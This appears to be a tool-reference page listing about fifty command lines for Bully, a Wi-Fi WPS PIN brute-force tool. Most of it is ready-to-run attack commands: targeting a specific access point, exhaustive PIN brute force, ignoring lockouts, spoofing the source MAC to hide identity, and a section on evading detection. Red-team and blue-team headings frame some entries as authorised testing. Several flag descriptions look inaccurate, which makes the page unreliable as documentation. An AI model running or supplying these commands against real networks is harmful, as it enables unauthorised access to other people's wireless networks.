# Bully

> A WPS brute-force tool written in C, an alternative to Reaver with improved handling of some access points.

- Category: Wireless
- Commands: 50
- Page: https://terminal.rokibulroni.com/tool/wireless/bully
- Homepage: https://github.com/aanarchyy/bully
- Tags: Wi-Fi, WPS, brute force

## Install

- apt: `sudo apt install bully`

## Basic Bully Syntax

### bully

```bash
bully
```

Displays the help menu and list of available options for the tool

### bully wlan0mon

```bash
bully wlan0mon
```

Starts scanning for WPS-enabled access points using the specified monitor mode interface


## Interface and Target Specification

### bully wlan0mon -b 00:11:22:33:44:55

```bash
bully wlan0mon -b 00:11:22:33:44:55
```

Targets a specific access point by its BSSID for WPS PIN testing

### bully wlan0mon -b 00:11:22:33:44:55 -c 6

```bash
bully wlan0mon -b 00:11:22:33:44:55 -c 6
```

Locks the wireless card to a specific channel to improve attack stability

### bully wlan0mon -b 00:11:22:33:44:55 -e MyTargetAP

```bash
bully wlan0mon -b 00:11:22:33:44:55 -e MyTargetAP
```

Specifies the ESSID of the target AP to ensure correct association


## WPS PIN Attack Workflows

### bully wlan0mon -b 00:11:22:33:44:55 -B

```bash
bully wlan0mon -b 00:11:22:33:44:55 -B
```

Forces the brute force mode to exhaustively test all possible PIN combinations

### bully wlan0mon -b 00:11:22:33:44:55 -S

```bash
bully wlan0mon -b 00:11:22:33:44:55 -S
```

Uses sequential PIN generation instead of randomized testing order

### bully wlan0mon -b 00:11:22:33:44:55 -p 12345670

```bash
bully wlan0mon -b 00:11:22:33:44:55 -p 12345670
```

Tests a specific 8-digit static PIN against the target access point

### bully wlan0mon -b 00:11:22:33:44:55 -p 1234

```bash
bully wlan0mon -b 00:11:22:33:44:55 -p 1234
```

Tests a specific 4-digit PIN prefix to check for partial validation


## Timing and Rate Control

### bully wlan0mon -b 00:11:22:33:44:55 -1 2 -2 10

```bash
bully wlan0mon -b 00:11:22:33:44:55 -1 2 -2 10
```

Sets custom delay times between M5/M7 message exchanges to evade detection

### bully wlan0mon -b 00:11:22:33:44:55 -l 300

```bash
bully wlan0mon -b 00:11:22:33:44:55 -l 300
```

Sets the lock wait time to 300 seconds when the AP reports a locked state

### bully wlan0mon -b 00:11:22:33:44:55 -L

```bash
bully wlan0mon -b 00:11:22:33:44:55 -L
```

Ignores the WPS locked status reported by the AP and continues testing

### bully wlan0mon -b 00:11:22:33:44:55 -r 3

```bash
bully wlan0mon -b 00:11:22:33:44:55 -r 3
```

Sets the number of retries for failed packets to 3 before moving on


## Output and Logging

### bully wlan0mon -b 00:11:22:33:44:55 -v 3

```bash
bully wlan0mon -b 00:11:22:33:44:55 -v 3
```

Increases verbosity level to 3 to display detailed transaction information

### bully wlan0mon -b 00:11:22:33:44:55 -v 4

```bash
bully wlan0mon -b 00:11:22:33:44:55 -v 4
```

Sets maximum verbosity to debug connection issues and protocol exchanges

### bully wlan0mon -b 00:11:22:33:44:55 -o scan_results.txt

```bash
bully wlan0mon -b 00:11:22:33:44:55 -o scan_results.txt
```

Logs the output of the session to a specified text file for analysis


## Advanced Configuration

### bully wlan0mon -b 00:11:22:33:44:55 -F

```bash
bully wlan0mon -b 00:11:22:33:44:55 -F
```

Forces the attack to proceed despite warnings or initial errors

### bully wlan0mon -b 00:11:22:33:44:55 -A

```bash
bully wlan0mon -b 00:11:22:33:44:55 -A
```

Disables the random checksum calculation for testing specific non-standard APs

### bully wlan0mon -b 00:11:22:33:44:55 -C

```bash
bully wlan0mon -b 00:11:22:33:44:55 -C
```

Skips the checksum digit validation when processing PINs

### bully wlan0mon -b 00:11:22:33:44:55 -d

```bash
bully wlan0mon -b 00:11:22:33:44:55 -d
```

Disables signal strength checks to force attempts on weak signals


## Red Team Attack Simulation

### bully wlan0mon -b 00:11:22:33:44:55 -B -v 3 -o audit.log

```bash
bully wlan0mon -b 00:11:22:33:44:55 -B -v 3 -o audit.log
```

Runs a logged brute force attack to simulate a persistent threat actor

### bully wlan0mon -b 00:11:22:33:44:55 -p 1234 -F

```bash
bully wlan0mon -b 00:11:22:33:44:55 -p 1234 -F
```

Simulates a targeted attack using a known PIN prefix with forced execution


## Purple Team Detection

### bully wlan0mon -b 00:11:22:33:44:55 -1 1 -2 1

```bash
bully wlan0mon -b 00:11:22:33:44:55 -1 1 -2 1
```

Sends packets rapidly to test if the IPS generates a rate-limiting alert

### bully wlan0mon -b 00:11:22:33:44:55 -l 5 -r 10

```bash
bully wlan0mon -b 00:11:22:33:44:55 -l 5 -r 10
```

Triggers rapid lockouts to verify the blue team's monitoring visibility


## Blue Team Defensive Validation

### bully wlan0mon -b 00:11:22:33:44:55 -p 00000000

```bash
bully wlan0mon -b 00:11:22:33:44:55 -p 00000000
```

Validates if the AP is vulnerable to default or empty PINs

### bully wlan0mon -b 00:11:22:33:44:55 -c 1 -v 3

```bash
bully wlan0mon -b 00:11:22:33:44:55 -c 1 -v 3
```

Monitors the AP response behavior on channel 1 with high verbosity


## Pixie Dust Workflows

### bully wlan0mon -b 00:11:22:33:44:55 -d -v 3

```bash
bully wlan0mon -b 00:11:22:33:44:55 -d -v 3
```

Uses the disable checks flag often utilized in Pixie Dust scripts for data gathering


## Resume and Recovery

### bully wlan0mon -b 00:11:22:33:44:55 -p <last_pin>

```bash
bully wlan0mon -b 00:11:22:33:44:55 -p <last_pin>
```

Example:

```bash
bully wlan0mon -b 00:11:22:33:44:55 -p 12345670
```

Resumes a previous session by starting manually from the last tested PIN

### bully wlan0mon -b 00:11:22:33:44:55 -S -p 50000000

```bash
bully wlan0mon -b 00:11:22:33:44:55 -S -p 50000000
```

Resumes a sequential attack starting from the halfway point of the keyspace


## Signal Handling

### bully wlan0mon -b 00:11:22:33:44:55 -5

```bash
bully wlan0mon -b 00:11:22:33:44:55 -5
```

Uses 5GHz band specific settings if supported by the wireless card and fork


## Combined Workflows

### bully wlan0mon -b 00:11:22:33:44:55 -c 6 -v 4 -l 360

```bash
bully wlan0mon -b 00:11:22:33:44:55 -c 6 -v 4 -l 360
```

Combines channel locking, debug output, and long lock waits for unstable APs

### bully wlan0mon -b 00:11:22:33:44:55 -L -F -v 3

```bash
bully wlan0mon -b 00:11:22:33:44:55 -L -F -v 3
```

Aggressive mode ignoring locks and forcing execution with detailed logs


## Automation Pipeline

### bully wlan0mon -b 00:11:22:33:44:55 -c 11 -r 2 -1 0 -2 0

```bash
bully wlan0mon -b 00:11:22:33:44:55 -c 11 -r 2 -1 0 -2 0
```

Zero delay configuration for high-speed automated testing environments

### timeout 300s bully wlan0mon -b 00:11:22:33:44:55

```bash
timeout 300s bully wlan0mon -b 00:11:22:33:44:55
```

Wraps bully in a timeout command to limit execution time in scripts


## Advanced Troubleshooting

### bully wlan0mon -b 00:11:22:33:44:55 -w

```bash
bully wlan0mon -b 00:11:22:33:44:55 -w
```

Detects and waits for Windows 7 registrar behavior quirks

### bully wlan0mon -b 00:11:22:33:44:55 -Z

```bash
bully wlan0mon -b 00:11:22:33:44:55 -Z
```

Suppresses the use of multicast frames during the association phase


## Custom PIN Testing

### bully wlan0mon -b 00:11:22:33:44:55 -p 1234567

```bash
bully wlan0mon -b 00:11:22:33:44:55 -p 1234567
```

Tests a 7-digit PIN trusting Bully to calculate the final checksum digit


## Performance Tuning

### bully wlan0mon -b 00:11:22:33:44:55 -1 0.5 -2 0.5

```bash
bully wlan0mon -b 00:11:22:33:44:55 -1 0.5 -2 0.5
```

Uses sub-second delays to fine-tune packet injection rates


## Identity Obfuscation

### bully wlan0mon -b 00:11:22:33:44:55 -s 00:aa:bb:cc:dd:ee

```bash
bully wlan0mon -b 00:11:22:33:44:55 -s 00:aa:bb:cc:dd:ee
```

Spoofs the source MAC address to bypass simple filters or hide identity


## Detection Evasion

### bully wlan0mon -b 00:11:22:33:44:55 -l 600 -r 1

```bash
bully wlan0mon -b 00:11:22:33:44:55 -l 600 -r 1
```

Sets extremely long lock waits and low retries to operate stealthily


## Incident Response Simulation

### bully wlan0mon -b 00:11:22:33:44:55 -B -v 1

```bash
bully wlan0mon -b 00:11:22:33:44:55 -B -v 1
```

Runs a low-noise brute force to test if IR teams detect subtle anomalies

### bully wlan0mon -b 00:11:22:33:44:55 -F -L -v 4

```bash
bully wlan0mon -b 00:11:22:33:44:55 -F -L -v 4
```

Generates a noisy, aggressive attack profile for IR alert validation


## Manual Indexing

### bully wlan0mon -b 00:11:22:33:44:55 -i 2

```bash
bully wlan0mon -b 00:11:22:33:44:55 -i 2
```

Selects a specific interface index when multiple cards are present


## Advanced Targeting

### bully wlan0mon -b 00:11:22:33:44:55 -c 6 -e TARGET_AP -B

```bash
bully wlan0mon -b 00:11:22:33:44:55 -c 6 -e TARGET_AP -B
```

Fully specified target lock ensuring no accidental adjacency attacks


## Exhaustive Testing

### bully wlan0mon -b 00:11:22:33:44:55 -S -p 00000000 -v 2

```bash
bully wlan0mon -b 00:11:22:33:44:55 -S -p 00000000 -v 2
```

Sequential test starting from the beginning with moderate logging


## Protocol Fuzzing

### bully wlan0mon -b 00:11:22:33:44:55 -A -C -F

```bash
bully wlan0mon -b 00:11:22:33:44:55 -A -C -F
```

Disables all checksums and safety checks to fuzz the AP's WPS handler


## No Monitor Check

### bully wlan0mon -b 00:11:22:33:44:55 --no-monitor-check

```bash
bully wlan0mon -b 00:11:22:33:44:55 --no-monitor-check
```

Skips the check for monitor mode (supported in some forks)


## Version Check

### bully -V

```bash
bully -V
```

Displays the program version number for audit reporting


## Help Display

### bully -h

```bash
bully -h
```

Prints the detailed help message and usage syntax


## Full Automation

### bully wlan0mon -b 00:11:22:33:44:55 -c 1 -S -v 3 -o report.txt -l 60 -r 2

```bash
bully wlan0mon -b 00:11:22:33:44:55 -c 1 -S -v 3 -o report.txt -l 60 -r 2
```

A complete audit command with channel lock, logging, and timing controls

## Related tools

- [Reaver](https://terminal.rokibulroni.com/tool/wireless/reaver)
- [airodump-ng](https://terminal.rokibulroni.com/tool/wireless/airodump-ng)
